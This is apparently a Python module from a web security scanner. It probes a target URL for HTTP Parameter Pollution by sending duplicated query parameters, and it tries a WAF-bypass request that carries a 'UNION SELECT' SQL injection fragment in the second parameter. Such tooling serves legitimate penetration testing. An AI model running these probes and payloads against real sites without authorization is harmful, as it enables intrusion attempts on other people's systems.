import requests
import urllib.parse
import copy
from colorama import Fore, Style

class HPPHunter:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'ZeroBurst-HPPHunter/47.0'}
        
        self.parsed = urllib.parse.urlparse(target_url)
        self.params = urllib.parse.parse_qs(self.parsed.query)
        self.base_url = target_url.split("?")[0]
        
        # Database Perilaku Standar (Reference)
        self.tech_behavior = {
            'PHP': 'Last Parameter (Takes the second value)',
            'ASP.NET': 'Concatenated (Value1,Value2)',
            'JSP/Servlet': 'First Parameter (Takes the first value)',
            'Node.js': 'First/Last (Depends on middleware)',
            'Python/Flask': 'First Parameter'
        }

    def analyze_behavior(self, param, original_val):
        """
        Mengirim dua nilai berbeda pada parameter yang sama
        untuk melihat mana yang diproses server.
        """
        # Nilai Uji Coba
        val1 = "zeroburst_start"
        val2 = "zeroburst_end"
        
        # Construct HPP URL: ?param=val1&param=val2
        # Kita harus menyusun string query manual karena dictionary python tidak support duplicate keys
        
        # 1. Hapus param target dari list params asli
        other_params = []
        for k, v in self.params.items():
            if k != param:
                other_params.append(f"{k}={v[0]}")
        
        # 2. Tambahkan parameter ganda
        hpp_query = f"{param}={val1}&{param}={val2}"
        
        if other_params:
            full_query = "&".join(other_params) + "&" + hpp_query
        else:
            full_query = hpp_query
            
        target_hpp = f"{self.base_url}?{full_query}"
        
        try:
            res = self.session.get(target_hpp, timeout=8)
            content = res.text
            
            # ANALISIS RESPON
            behavior = "Unknown/Ignored"
            color = Fore.WHITE
            
            if val1 in content and val2 in content:
                # Cek urutan atau penggabungan
                if f"{val1},{val2}" in content:
                    behavior = "CONCATENATED (ASP.NET Style)"
                    color = Fore.RED # Berisiko tinggi untuk SQLi/XSS
                else:
                    behavior = "BOTH REFLECTED (Multiple Occurrences)"
                    color = Fore.YELLOW
            elif val1 in content:
                behavior = "FIRST PARAMETER (JSP/Python Style)"
                color = Fore.CYAN
            elif val2 in content:
                behavior = "LAST PARAMETER (PHP Style)"
                color = Fore.CYAN
            
            # Cek Error (Indikasi aplikasi bingung)
            if res.status_code == 500:
                print(f"   {Fore.RED}[ERROR] Server 500 Error on HPP! Potential DoS or Unhandled Exception.{Style.RESET_ALL}")
                return

            if behavior != "Unknown/Ignored":
                print(f"   {Fore.GREEN}[INFO] Parameter '{param}' Behavior Detected:{Style.RESET_ALL}")
                print(f"   ├── Payload : {param}={val1}&{param}={val2}")
                print(f"   └── Result  : {color}{behavior}{Style.RESET_ALL}")
                
                # Analisis Risiko
                if "CONCATENATED" in behavior:
                    print(f"       {Fore.YELLOW}[RISK] Concatenation allows WAF Bypass or SQL Injection via comma.{Style.RESET_ALL}")
                elif "LAST" in behavior:
                    print(f"       {Fore.YELLOW}[RISK] 'Last Parameter' preference allows overriding protected values.{Style.RESET_ALL}")

        except Exception as e:
            pass

    def test_waf_bypass_potential(self, param):
        """
        Simulasi Bypass WAF sederhana.
        Skenario: WAF memblokir 'union select' di parameter pertama,
        tapi apakah dia mengecek parameter kedua?
        """
        # Payload: ?id=1&id=UNION SELECT 1
        payload_safe = "1"
        payload_bad = "UNION SELECT 1-- - "
        
        # Manual construct
        query = f"{param}={payload_safe}&{param}={payload_bad}"
        url = f"{self.base_url}?{query}"
        
        try:
            res = self.session.get(url, timeout=5)
            # Jika tidak 403 Forbidden, ada kemungkinan WAF hanya cek parameter pertama
            if res.status_code != 403:
                print(f"   {Fore.MAGENTA}[HPP WAF TEST] Server accepted HPP payload (Status: {res.status_code}).{Style.RESET_ALL}")
                print(f"   └── Check if the second parameter ({payload_bad.strip()}) was processed.")
        except:
            pass

    def run_scan(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: HTTP Parameter Pollution (HPP) Auditor{Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{self.target}")
        
        if not self.params:
            print(f"{Fore.RED}[!] No GET parameters found. HPP needs inputs.{Style.RESET_ALL}")
            return

        print(f"{Fore.YELLOW}[+] Analyzing Parameter Precedence & Pollution...{Style.RESET_ALL}")

        for param in self.params.keys():
            print(f"\n{Fore.WHITE}>>> Testing Parameter: {Fore.GREEN}'{param}'{Style.RESET_ALL}")
            self.analyze_behavior(param, self.params[param][0])
            self.test_waf_bypass_potential(param)

        print("-" * 60)
        print(f"{Fore.CYAN}[*] HPP Audit Completed.{Style.RESET_ALL}")

def run_hpp_scan(url):
    engine = HPPHunter(url)
    engine.run_scan()